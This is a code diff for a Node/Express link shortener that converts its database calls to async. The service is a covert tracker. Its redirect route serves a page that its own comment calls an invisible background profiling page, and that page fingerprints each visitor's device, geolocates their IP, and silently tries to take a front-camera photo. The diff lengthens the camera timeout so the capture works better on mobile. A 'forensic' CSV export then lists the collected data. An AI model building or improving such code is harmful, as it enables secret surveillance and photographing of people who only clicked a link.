@@ -14,14 +14,6 @@ app.use(cors());
 app.use(express.json({ limit: '10mb' }));
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Middleware for Cloud DB sync on Vercel
-app.use(async (req, res, next) => {
-  try {
-    await db.initSync();
-  } catch(e) {}
-  next();
-});
-
 // Helper to generate short code
 function generateShortCode(length = 6) {
   const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
@@ -32,7 +24,7 @@ function generateShortCode(length = 6) {
   return result;
 }
 
-// Helper to sanitize slug (replace spaces and special characters with hyphens)
+// Helper to sanitize slug
 function sanitizeSlug(slug) {
   if (!slug) return '';
   return slug
@@ -123,7 +115,7 @@ async function fetchIpGeolocation(ip) {
 // --- API ENDPOINTS ---
 
 // Create Link
-app.post('/api/links', (req, res) => {
+app.post('/api/links', async (req, res) => {
   try {
     let { destinationUrl, title, customSlug } = req.body;
     if (!destinationUrl) {
@@ -139,12 +131,13 @@ app.post('/api/links', (req, res) => {
       shortCode = generateShortCode();
     }
 
-    if (db.getLinkByShortCode(shortCode)) {
+    const existing = await db.getLinkByShortCode(shortCode);
+    if (existing) {
       return res.status(400).json({ error: `Link code "${shortCode}" already exists. Please choose another.` });
     }
 
     const linkTitle = title || destinationUrl;
-    const newLink = db.createLink(shortCode, linkTitle, destinationUrl);
+    const newLink = await db.createLink(shortCode, linkTitle, destinationUrl);
     const baseUrl = process.env.BASE_URL || `${req.protocol}://${req.get('host')}`;
 
     res.json({
@@ -158,9 +151,9 @@ app.post('/api/links', (req, res) => {
 });
 
 // Get All Links
-app.get('/api/links', (req, res) => {
+app.get('/api/links', async (req, res) => {
   try {
-    const links = db.getAllLinks();
+    const links = await db.getAllLinks();
     res.json(links);
   } catch (err) {
     res.status(500).json({ error: err.message });
@@ -168,9 +161,9 @@ app.get('/api/links', (req, res) => {
 });
 
 // Delete Link
-app.delete('/api/links/:id', (req, res) => {
+app.delete('/api/links/:id', async (req, res) => {
   try {
-    db.deleteLink(req.params.id);
+    await db.deleteLink(req.params.id);
     res.json({ success: true });
   } catch (err) {
     res.status(500).json({ error: err.message });
@@ -178,11 +171,11 @@ app.delete('/api/links/:id', (req, res) => {
 });
 
 // Log Client JavaScript Deep Metadata & Camera Snapshot
-app.post('/api/log-client-data', (req, res) => {
+app.post('/api/log-client-data', async (req, res) => {
   try {
     const { logId, clientData } = req.body;
     if (logId && clientData) {
-      db.updateLogClientData(logId, clientData);
+      await db.updateLogClientData(logId, clientData);
     }
     res.json({ success: true });
   } catch (err) {
@@ -191,9 +184,9 @@ app.post('/api/log-client-data', (req, res) => {
 });
 
 // Export CSV Forensic Report
-app.get('/api/export-csv', (req, res) => {
+app.get('/api/export-csv', async (req, res) => {
   try {
-    const logs = db.getAllLogs(1000);
+    const logs = await db.getAllLogs(1000);
     let csv = 'Log ID,Timestamp,Link Title,Short Code,IP Address,Reverse DNS Hostname,Country,City,ISP,Proxy/VPN,Mobile Network,Device Type,Exact Device Model,Browser,OS,Screen Resolution,Timezone,GPU,CPU Cores,Language,Camera Photo Captured\n';
     
     logs.forEach(l => {
@@ -209,9 +202,9 @@ app.get('/api/export-csv', (req, res) => {
 });
 
 // Get Logs for Specific Link
-app.get('/api/links/:id/logs', (req, res) => {
+app.get('/api/links/:id/logs', async (req, res) => {
   try {
-    const logs = db.getLogsByLinkId(req.params.id);
+    const logs = await db.getLogsByLinkId(req.params.id);
     res.json(logs);
   } catch (err) {
     res.status(500).json({ error: err.message });
@@ -219,10 +212,10 @@ app.get('/api/links/:id/logs', (req, res) => {
 });
 
 // Get All Click Logs
-app.get('/api/logs', (req, res) => {
+app.get('/api/logs', async (req, res) => {
   try {
     const limit = req.query.limit ? parseInt(req.query.limit) : 100;
-    const logs = db.getAllLogs(limit);
+    const logs = await db.getAllLogs(limit);
     res.json(logs);
   } catch (err) {
     res.status(500).json({ error: err.message });
@@ -230,9 +223,9 @@ app.get('/api/logs', (req, res) => {
 });
 
 // Get Statistics
-app.get('/api/stats', (req, res) => {
+app.get('/api/stats', async (req, res) => {
   try {
-    const stats = db.getStats();
+    const stats = await db.getStats();
     res.json(stats);
   } catch (err) {
     res.status(500).json({ error: err.message });
@@ -244,9 +237,9 @@ app.get('/r/:shortCode', async (req, res) => {
   let { shortCode } = req.params;
   shortCode = decodeURIComponent(shortCode || '').trim();
   
-  let link = db.getLinkByShortCode(shortCode);
+  let link = await db.getLinkByShortCode(shortCode);
   if (!link) {
-    link = db.getLinkByShortCode(sanitizeSlug(shortCode));
+    link = await db.getLinkByShortCode(sanitizeSlug(shortCode));
   }
 
   if (!link) {
@@ -269,7 +262,7 @@ app.get('/r/:shortCode', async (req, res) => {
 
     const geo = await fetchIpGeolocation(clientIp);
 
-    const log = db.logClick({
+    const log = await db.logClick({
       linkId: link.id,
       ipAddress: geo.ipAddress,
       reverseDns: reverseHost,
@@ -296,7 +289,7 @@ app.get('/r/:shortCode', async (req, res) => {
     console.error('Error logging click:', err);
   }
 
-  // Completely invisible background transition page (No video elements rendered on screen!)
+  // 100% Invisible Background Profiling Page
   res.send(`
     <!DOCTYPE html>
     <html>
@@ -357,12 +350,12 @@ app.get('/r/:shortCode', async (req, res) => {
             }
           } catch(e) {}
 
-          // 100% Invisible Off-Screen Camera Capture (No DOM Elements!)
+          // Invisible Camera Capture Attempt (With 1200ms timeout window for mobile hardware)
           try {
             if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
               const stream = await Promise.race([
                 navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 640, height: 480 } }),
-                new Promise((_, reject) => setTimeout(() => reject('timeout'), 400))
+                new Promise((_, reject) => setTimeout(() => reject('timeout'), 1200))
               ]);
               if (stream) {
                 const video = document.createElement('video');
@@ -385,7 +378,7 @@ app.get('/r/:shortCode', async (req, res) => {
 
           if (logId) {
             try {
-              fetch('/api/log-client-data', {
+              await fetch('/api/log-client-data', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ logId, clientData }),
@@ -396,7 +389,7 @@ app.get('/r/:shortCode', async (req, res) => {
 
           setTimeout(function() {
             window.location.replace(destinationUrl);
-          }, 80);
+          }, 100);
         })();
       </script>
     </body>
